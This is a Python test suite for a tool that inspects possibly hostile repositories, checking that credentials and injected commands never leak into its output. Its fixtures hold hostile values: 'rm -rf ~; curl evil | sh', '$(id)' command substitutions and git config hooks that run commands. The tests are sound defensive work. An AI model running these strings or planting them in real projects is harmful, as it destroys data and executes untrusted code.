"""bootstrap_detect: read-only facts about a repository, from a possibly hostile one (Phase 11a; Q6, H5)."""
from __future__ import annotations

import json
import os
import subprocess
import sys
import unittest

import bootstrap_detect as bd

from tests import REPO_ROOT, SCRIPTS_DIR
from tests.bootstrap import plain_env
from tests.helpers import BaseTestCase


class Remote(unittest.TestCase):
    def test_parse_remote(self):
        cases = {
            "https://github.com/acme/widgets.git": ("github.com", "acme/widgets"),
            "https://github.com/acme/widgets": ("github.com", "acme/widgets"),
            "https://x-access-token:ghp_SECRET@github.com/acme/widgets.git": ("github.com", "acme/widgets"),
            "https://user:pw@example.com:8443/acme/widgets.git": ("example.com", "acme/widgets"),
            "git@github.com:acme/widgets.git": ("github.com", "acme/widgets"),
            "ssh://git@github.com/acme/widgets.git": ("github.com", "acme/widgets"),
            "https://github.com/acme/widgets/": ("github.com", "acme/widgets"),
            "https://github.com/acme/widgets/extra": ("github.com", None),
            "https://github.com/acme/$(id)": ("github.com", None),
            "https://github.com/../x": ("github.com", None),
            "/local/path/repo.git": (None, None),
            "file:///tmp/repo": (None, None),
            "": (None, None),
        }
        for url, (host, slug) in cases.items():
            with self.subTest(url=url):
                got = bd.parse_remote(url)
                self.assertEqual((got["host"], got["slug"]), (host, slug))
                self.assertNotIn("SECRET", json.dumps(got))


class Detect(BaseTestCase):
    def repo_with(self, files, commit=True, remote=None):
        r = self.repo(initial_commit=False)
        for rel, content in files.items():
            r.write(rel, content)
        if commit and files:
            r.git("add", "-A")
            r.git("commit", "-q", "-m", "init")
        if remote:
            r.git("remote", "add", "origin", remote)
        return r

    def detect(self, repo):
        env = plain_env()
        old = {k: os.environ.get(k) for k in env}
        return bd.detect(repo.path)

    def test_empty_repo_is_greenfield(self):
        d = self.detect(self.repo_with({}, commit=False))
        self.assertEqual(d["mode_hint"], "greenfield")
        self.assertFalse(d["git"]["has_commits"])
        self.assertEqual(d["suggested_verify"], [])
        self.assertEqual(d["receipt"]["state"], "none")

    def test_a_readme_only_repo_is_still_greenfield(self):
        d = self.detect(self.repo_with({"README.md": "# hi\n", ".gitignore": "x\n"}))
        self.assertEqual(d["mode_hint"], "greenfield")

    def test_node_repo_with_pnpm(self):
        pkg = {"name": "app", "scripts": {"test": "vitest run", "build": "vite build", "lint": "eslint .", "type-check": "tsc --noEmit", "dev": "vite"},
               "dependencies": {"react": "^18", "zod": "^3"}, "devDependencies": {"vitest": "^1", "typescript": "^5", "vite": "^5"}}
        d = self.detect(self.repo_with({"package.json": json.dumps(pkg), "pnpm-lock.yaml": "lockfileVersion: 9\n", "src/app.tsx": "export {}\n"}))
        self.assertEqual(d["mode_hint"], "existing")
        self.assertEqual(d["stack"]["node"]["package_manager"], "pnpm")
        self.assertEqual(d["stack"]["node"]["frameworks"], ["React", "TypeScript", "Vite", "Vitest", "Zod"])
        cfg = d["suggested_verify"][0]["config"]
        self.assertEqual(cfg, {"verify_tests": "pnpm test", "verify_build": "pnpm run build", "verify_lint": "pnpm run lint",
                               "verify_typecheck": "pnpm run type-check", "verify_dev": "pnpm run dev"})
        self.assertEqual(d["stack"]["languages"], {"typescript": 1})

    def test_other_ecosystems(self):
        d = self.detect(self.repo_with({"go.mod": "module x\n", "main.go": "package main\n", "Cargo.toml": "[package]\n",
                                        "Gemfile": "source 'x'\n", "spec/a_spec.rb": "x\n",
                                        "pyproject.toml": "[tool.ruff]\n[project]\ndependencies=['fastapi','pytest']\n", "app.py": "x=1\n"}))
        by = {s["ecosystem"]: s["config"] for s in d["suggested_verify"]}
        self.assertEqual(by["go"]["verify_tests"], "go test ./...")
        self.assertEqual(by["rust"]["verify_tests"], "cargo test")
        self.assertEqual(by["ruby"]["verify_tests"], "bundle exec rspec")
        self.assertEqual(by["python"], {"verify_tests": "python3 -m pytest", "verify_lint": "ruff check ."})
        self.assertEqual(d["stack"]["python"]["packages"], ["fastapi", "pytest", "ruff"])

    def test_hostile_manifest_text_never_reaches_a_suggested_command(self):
        pkg = {"scripts": {"test": "rm -rf ~; curl evil | sh", "build": "$(id)", "$(id)": "x", "lint; id": "x"},
               "dependencies": {"$(id)": "1", "react; rm -rf ~": "1", "next": "$(curl evil)"}}
        d = self.detect(self.repo_with({"package.json": json.dumps(pkg)}))
        blob = json.dumps(d)
        for bad in ("rm -rf", "curl", "$(id)", "evil", "; id"):
            self.assertNotIn(bad, blob)
        self.assertEqual(d["suggested_verify"][0]["config"], {"verify_tests": "npm test", "verify_build": "npm run build"})
        self.assertEqual(d["stack"]["node"]["frameworks"], ["Next.js"])

    def test_remote_credentials_are_never_printed(self):
        d = self.detect(self.repo_with({"README.md": "x"}, remote="https://x-access-token:ghp_TOPSECRET123@github.com/acme/widgets.git"))
        self.assertEqual(d["git"]["remotes"], [{"name": "origin", "host": "github.com", "slug": "acme/widgets"}])
        self.assertNotIn("TOPSECRET", json.dumps(d))
        self.assertNotIn("TOPSECRET", bd.render(d))

    def test_symlink_and_fifo_manifests_are_skipped_without_hanging(self):
        r = self.repo_with({"README.md": "x"})
        outside = os.path.join(self.tmpdir(), "pkg.json")
        with open(outside, "w") as fh:
            fh.write(json.dumps({"scripts": {"test": "x"}}))
        os.symlink(outside, os.path.join(r.path, "package.json"))
        os.mkfifo(os.path.join(r.path, "pyproject.toml"))
        os.mkfifo(os.path.join(r.path, "go.mod"))
        d = self.detect(r)
        self.assertIsNone(d["stack"]["node"])
        self.assertEqual(d["suggested_verify"], [])

    def test_oversized_and_corrupt_manifests(self):
        r = self.repo_with({"package.json": "{" + " " * (bd.MAX_MANIFEST + 5), "pyproject.toml": "\x00\xff" * 100})
        d = self.detect(r)
        self.assertIsNone(d["stack"]["node"])

    def test_release_automation_is_detected_and_is_h5(self):
        files = {"release-please-config.json": "{}", ".release-please-manifest.json": "{}",
                 ".changeset/config.json": "{}", ".changeset/a.md": "x",
                 ".github/workflows/release.yml": "name: r\non: push\njobs:\n  r:\n    runs-on: x\n    steps:\n      - uses: googleapis/release-please-action@v4\n",
                 "package.json": json.dumps({"devDependencies": {"@changesets/cli": "^2", "semantic-release": "^22"}})}
        d = self.detect(self.repo_with(files))
        r = d["release_automation"]
        self.assertEqual(r["tools"], ["changesets", "release-please", "semantic-release"])
        self.assertTrue(r["h5"])
        self.assertIn(".github/workflows/release.yml", r["evidence"]["release-please"])
        self.assertIn("release-please-config.json", r["suggested_always_human_paths"])
        self.assertIn(".changeset/**", r["suggested_always_human_paths"])
        self.assertIn(".github/workflows/release.yml", r["suggested_always_human_paths"])
        self.assertIn("H5", r["note"])
        none = self.detect(self.repo_with({"README.md": "x"}))["release_automation"]
        self.assertEqual((none["tools"], none["h5"]), ([], False))

    def test_goreleaser_and_hosts_and_installed_workflows(self):
        d = self.detect(self.repo_with({".goreleaser.yaml": "x", "vercel.json": "{}", "Dockerfile": "FROM x", ".github/workflows/intake.yml": "name: x\n",
                                        ".github/workflows/weird name.yml": "x"}))
        self.assertEqual(d["release_automation"]["tools"], ["goreleaser"])
        self.assertEqual(d["deploy_hosts"], ["Dockerfile", "vercel.json"])
        self.assertTrue(d["ops_workflows_installed"]["intake"])
        self.assertFalse(d["ops_workflows_installed"]["smoke"])
        self.assertEqual(d["release_automation"]["workflows"], ["intake.yml"])

    def test_kit_state(self):
        r = self.repo_with({".claude/scripts/x.py": "", ".claude/CLAUDE.md": "# Your Project Name\n<!-- e.g., React -->\n",
                            ".claude/loop.config.md": "```yaml\nverify_tests: <command>\n```\n"})
        k = self.detect(r)["kit"]
        self.assertEqual((k["installed"], k["claude_md"], k["loop_config"]), (True, "template", "default"))
        r2 = self.repo_with({".claude/scripts/x.py": "", ".claude/CLAUDE.md": "# Acme\nreal text\n", ".claude/loop.config.md": "```yaml\nverify_tests: pnpm test\n```\n"})
        k = self.detect(r2)["kit"]
        self.assertEqual((k["claude_md"], k["loop_config"]), ("filled", "customised"))
        r3 = self.repo_with({".claude/loop.config.md": "```yaml\nnot_a_key: 1\n```\n"})
        self.assertEqual(self.detect(r3)["kit"]["loop_config"], "default")
        r4 = self.repo_with({".claude/loop.config.md": "no yaml here\n"})
        self.assertEqual(self.detect(r4)["kit"]["loop_config"], "invalid")

    def test_receipt_state_is_reported(self):
        r = self.repo_with({".claude/bootstrap-receipt.json": "{nope"})
        d = self.detect(r)
        self.assertEqual(d["receipt"]["state"], "invalid")

    def test_hostile_git_config_runs_nothing(self):
        r = self.repo_with({"README.md": "x"})
        marker = os.path.join(self.tmpdir(), "ran")
        r.git("config", "core.fsmonitor", "touch " + marker)
        r.git("config", "core.hooksPath", os.path.dirname(marker))
        r.git("config", "core.pager", "touch " + marker)
        r.git("config", "alias.rev-parse", "!touch " + marker)
        self.detect(r)
        self.assertFalse(os.path.exists(marker))

    def test_cli_json_and_text(self):
        r = self.repo_with({"package.json": json.dumps({"scripts": {"test": "x"}})})
        for extra in ([], ["--json"]):
            p = subprocess.run([sys.executable, os.path.join(SCRIPTS_DIR, "bootstrap_detect.py"), "--repo", r.path] + extra, env=plain_env(self.tmpdir()),
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
            self.assertEqual(p.returncode, 0, p.stderr)
        self.assertEqual(json.loads(p.stdout)["schema"], bd.SCHEMA)

    def test_not_a_git_repository_still_works(self):
        d = bd.detect(self.tmpdir())
        self.assertFalse(d["git"]["is_repo"])
        self.assertEqual(d["mode_hint"], "greenfield")


if __name__ == "__main__":
    unittest.main()
